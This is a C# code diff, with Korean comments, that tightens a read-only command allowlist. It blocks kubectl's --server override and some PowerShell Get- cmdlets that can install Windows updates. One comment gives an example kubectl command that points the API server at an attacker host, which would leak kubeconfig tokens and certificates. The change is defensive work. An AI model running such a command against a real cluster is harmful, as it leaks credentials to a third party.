@@ -322,6 +322,9 @@ public static class ReadOnlyCommands
             case "kubectl":
             {
                 if (a.Any(x => x.StartsWith("--kubeconfig", StringComparison.Ordinal))) return false;   // exec 자격 증명 플러그인 실행 가능
+                // -s/--server 로 API 서버 주소를 바꾸면 kubeconfig 의 토큰·클라이언트 인증서가 그 서버로 간다 (kubectl get pods -s https://공격자)
+                if (a.Any(x => (x.StartsWith("-s", StringComparison.Ordinal) && !x.StartsWith("--", StringComparison.Ordinal)) ||
+                               LongPrefix(x, "server", "tls-server-name"))) return false;
                 if (!SubStart(a, out var i, new[] { "-A", "--all-namespaces" }, new[] { "-n", "--namespace", "--context", "--cluster", "--user" })) return false;
                 var sub = At(a, i);
                 if (sub == "config") return At(a, i + 1) is "view" or "get-contexts" or "current-context" && NoMutating(a, i + 2);
@@ -586,6 +589,15 @@ public static class ReadOnlyCommands
         "Test-Path", "Test-Connection", "Test-NetConnection", "Test-WSMan",
     };
 
+    /// <summary>
+    /// Get 동사지만 바꾸는 일을 할 수 있는 cmdlet (모듈 별칭 포함): PSWindowsUpdate 의 Get-WindowsUpdate(-Install · -Download · -AutoReboot · -Hide),
+    /// 그 별칭 Get-WUList, Install-WindowsUpdate 의 별칭 Get-WUInstall
+    /// </summary>
+    private static readonly HashSet<string> PsGetDenied = new(StringComparer.OrdinalIgnoreCase)
+    {
+        "Get-WindowsUpdate", "Get-WUList", "Get-WUInstall",
+    };
+
     private static readonly HashSet<string> PsSpecific = new(StringComparer.OrdinalIgnoreCase)
     {
         "Write-Output", "Write-Host", "Out-String", "Out-Null", "Out-Host",
@@ -653,7 +665,7 @@ public static class ReadOnlyCommands
         {
             var name = m.Value;
             if (PsSpecific.Contains(name)) continue;
-            if (!PsVerbs.Contains(m.Groups[1].Value)) { reason = $"읽기 전용이 아닌 cmdlet: {name}"; return false; }
+            if (!PsVerbs.Contains(m.Groups[1].Value) || PsGetDenied.Contains(name)) { reason = $"읽기 전용이 아닌 cmdlet: {name}"; return false; }
             if (m.Groups[1].Value.Equals("Test", StringComparison.OrdinalIgnoreCase) && !PsTestAllowed.Contains(name))
             { reason = $"확인되지 않은 Test cmdlet: {name}"; return false; }
         }
